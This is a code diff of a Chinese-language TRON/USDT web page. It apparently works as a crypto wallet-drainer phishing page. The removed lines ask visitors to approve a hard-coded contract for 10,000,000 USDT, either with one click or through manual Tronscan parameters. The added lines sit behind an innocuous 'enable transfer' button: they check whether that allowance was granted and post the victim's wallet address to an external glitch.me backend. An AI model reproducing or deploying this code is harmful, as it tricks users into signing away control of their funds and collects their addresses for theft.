@@ -2,94 +2,52 @@
 <html lang="zh">
 <head>
   <meta charset="UTF-8">
-  <title>USDT 授權入口</title>
+  <title>USDT 授權啟動</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.min.js"></script>
   <style>
-    body { font-family: sans-serif; background: #f9f9f9; text-align: center; padding: 2em; }
-    h1 { color: #2d3436; }
-    .button {
-      display: inline-block;
-      margin: 1em;
-      background: #00b894;
-      color: white;
-      padding: 1em 2em;
-      text-decoration: none;
-      font-size: 1.1em;
+    body { font-family: sans-serif; padding: 2em; background: #f2f2f2; text-align: center; }
+    button {
+      background: #0984e3;
+      color: #fff;
       border: none;
+      padding: 1em 2em;
       border-radius: 8px;
+      font-size: 1.2em;
       cursor: pointer;
-    }
-    .tip, .fallback {
-      margin-top: 2em;
-      font-size: 0.9em;
-      color: #636e72;
-      max-width: 480px;
-      margin-left: auto;
-      margin-right: auto;
-    }
-    code {
-      background: #ececec;
-      padding: 0.2em 0.4em;
-      border-radius: 5px;
-      display: block;
-      margin: 0.5em 0;
-      word-break: break-all;
     }
   </style>
 </head>
 <body>
-  <h1>USDT 授權入口</h1>
-  <p>本頁面將協助你授權我們的合約操作你的 USDT。請依照下方方式進行：</p>
-
-  <div id="main"></div>
-  <div class="tip" id="status"></div>
-
-  <div class="fallback" id="manual" style="display:none">
-    <h3>🚫 無法偵測 TronLink，請手動授權</h3>
-    <p>請複製以下參數至 <a href="https://tronscan.org/#/contract/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/interact" target="_blank">Tronscan 授權頁</a>：</p>
-    <strong>合約方法：</strong> approve(address,uint256)
-    <code>地址：TMxu165T2e3ZKWzgt7gipzmHwE5KYuibGa</code>
-    <code>金額：10000000000000（10,000,000 USDT）</code>
-    <p>或使用支援 DApp 的錢包開啟本頁，例如 TronLink。</p>
-  </div>
+  <button onclick="checkWallet()">開啟轉帳功能</button>
 
   <script>
-    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
     const AUTH_CONTRACT = "TMxu165T2e3ZKWzgt7gipzmHwE5KYuibGa";
-    const AMOUNT = "10000000000000"; // 10,000,000 USDT
+    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const BACKEND = "https://peaceful-precious-ceres.glitch.me";
 
-    async function authorizeUSDT() {
-      const status = document.getElementById("status");
-      try {
-        const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
-        const tx = await contract.approve(AUTH_CONTRACT, AMOUNT).send();
-        status.innerHTML = `✅ 授權成功！交易哈希：<br><code>${tx}</code>`;
-      } catch (err) {
-        status.innerText = "❌ 授權失敗：" + err.message;
+    async function checkWallet() {
+      const address = tronWeb.defaultAddress.base58;
+      if (!address || !/^T[a-zA-Z0-9]{33}$/.test(address)) {
+        return alert("請使用 TronLink 並登入錢包");
       }
-    }
 
-    function showInteractiveButton() {
-      const div = document.getElementById("main");
-      const btn = document.createElement("button");
-      btn.className = "button";
-      btn.innerText = "🔐 一鍵授權 USDT";
-      btn.onclick = authorizeUSDT;
-      div.appendChild(btn);
-    }
+      try {
+        const usdt = await tronWeb.contract().at(USDT_CONTRACT);
+        const allowance = await usdt.allowance(address, AUTH_CONTRACT).call();
+        const allowed = parseFloat(allowance.toString()) / 1e6;
 
-    if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-      showInteractiveButton();
-    } else {
-      // 嘗試延遲等待 tronWeb 掛載
-      setTimeout(() => {
-        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-          showInteractiveButton();
+        if (allowed > 0) {
+          await axios.post(`${BACKEND}/wallets`, { address });
+          alert("✅ 已授權 USDT 使用權給合約");
         } else {
-          document.getElementById("manual").style.display = "block";
+          alert("⚠️ 尚未授權或授權額度為 0");
         }
-      }, 1500);
+      } catch (err) {
+        console.error(err);
+        alert("查詢授權失敗：" + err.message);
+      }
     }
   </script>
 </body>
